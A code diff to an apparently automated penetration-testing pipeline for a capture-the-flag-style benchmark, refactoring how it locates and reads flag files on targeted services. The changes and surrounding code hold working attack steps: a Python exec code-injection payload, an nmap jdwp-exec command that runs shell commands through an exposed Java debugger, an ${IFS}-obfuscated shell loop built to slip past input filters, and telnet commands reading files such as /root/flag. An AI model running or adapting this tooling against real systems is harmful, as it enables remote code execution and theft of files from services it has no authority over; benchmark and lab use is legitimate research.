@@ -1983,6 +1983,47 @@ class FourPillarPipeline:
         external = self._benchmark_string_tuple(data.get("probe_paths"), limit=160)
         return list(dict.fromkeys(self._benchmark_builtin_probe_paths() + list(external)))
 
+    @staticmethod
+    def _benchmark_builtin_flag_paths() -> tuple[str, ...]:
+        return (
+            "/challenge/flag.txt",
+            "/challenge/flag",
+            "/flag",
+            "/flag.txt",
+            "/root/flag",
+            "/root/flag.txt",
+            "/tmp/flag",
+            "/tmp/flag.txt",
+            "/home/flag",
+            "/home/flag.txt",
+            "/run/secrets/flag",
+            "/hugegraph-server/flag",
+            "/hugegraph-server/flag.txt",
+        )
+
+    @staticmethod
+    def _benchmark_is_safe_flag_path(path: str) -> bool:
+        return bool(_re_mod.fullmatch(r"/[A-Za-z0-9._/\-{}]{1,220}", path))
+
+    def _benchmark_flag_paths(self, *, limit: int = 40) -> tuple[str, ...]:
+        data = self._benchmark_external_profiles()
+        external = self._benchmark_string_tuple(data.get("flag_paths"), limit=80)
+        paths: list[str] = []
+        for raw_path in self._benchmark_builtin_flag_paths() + external:
+            path = str(raw_path or "").strip()
+            if not path:
+                continue
+            if not path.startswith("/"):
+                path = f"/{path}"
+            if not self._benchmark_is_safe_flag_path(path):
+                continue
+            paths.append(path)
+        return tuple(dict.fromkeys(paths))[: max(1, min(limit, 80))]
+
+    def _benchmark_flag_cat_command(self, *, limit: int = 10) -> str:
+        paths = self._benchmark_flag_paths(limit=limit)
+        return f"cat {' '.join(paths)} 2>/dev/null\n"
+
     def _benchmark_builtin_service_probe_profiles(self) -> list[dict[str, Any]]:
         return [
             {
@@ -2254,14 +2295,7 @@ class FourPillarPipeline:
             if code in completed:
                 return "\n".join(outputs)
 
-        flag_paths = (
-            "/challenge/flag.txt",
-            "/flag",
-            "/flag.txt",
-            "/root/flag",
-            "/root/flag.txt",
-        )
-        for flag_path in flag_paths:
+        for flag_path in self._benchmark_flag_paths(limit=20):
             payload = {
                 "code": (
                     "@exec(\"raise Exception(open("
@@ -2563,6 +2597,7 @@ class FourPillarPipeline:
             outputs.append(f"handshake_error={exc}")
             return "\n".join(outputs)
 
+        nmap_flag_command = self._benchmark_flag_cat_command(limit=20).strip()
         nmap_cmd = [
             "nmap",
             "-n",
@@ -2571,7 +2606,7 @@ class FourPillarPipeline:
             f"-p{port}",
             "--script=+jdwp-exec",
             "--script-args",
-            "cmd=cat /flag",
+            f"cmd={nmap_flag_command}",
             host,
         ]
         try:
@@ -2584,7 +2619,7 @@ class FourPillarPipeline:
                 timeout=20,
             )
             outputs.append(
-                "## jdwp-exec cat /flag\n"
+                f"## jdwp-exec {nmap_flag_command}\n"
                 f"{(result.stdout or '')[:5000]}\n{(result.stderr or '')[:1000]}"
             )
         except Exception as exc:
@@ -2658,19 +2693,7 @@ class FourPillarPipeline:
         accept_thread = threading.Thread(target=accept_once, daemon=True)
         accept_thread.start()
 
-        flag_paths = (
-            "/flag",
-            "/flag.txt",
-            "/root/flag",
-            "/root/flag.txt",
-            "/tmp/flag",
-            "/tmp/flag.txt",
-            "/home/flag",
-            "/home/flag.txt",
-            "/hugegraph-server/flag",
-            "/hugegraph-server/flag.txt",
-        )
-        path_list = "${IFS}".join(flag_paths)
+        path_list = "${IFS}".join(self._benchmark_flag_paths(limit=20))
         file_loop = (
             f"for${{IFS}}f${{IFS}}in${{IFS}}{path_list};"
             "do${IFS}[${IFS}-r${IFS}$f${IFS}]&&cat${IFS}$f;"
@@ -3381,10 +3404,7 @@ class FourPillarPipeline:
         raw = str(data.get("telnet_flag_command") or "").strip()
         if raw:
             return raw[:400] + ("\n" if not raw.endswith("\n") else "")
-        return (
-            "cat /challenge/flag.txt /flag /flag.txt /root/flag "
-            "/root/flag.txt 2>/dev/null\n"
-        )
+        return self._benchmark_flag_cat_command(limit=20)
 
     def _benchmark_probe_handoff_followup_local(self, code: str, addrs: list[str]) -> str:
         if not addrs:
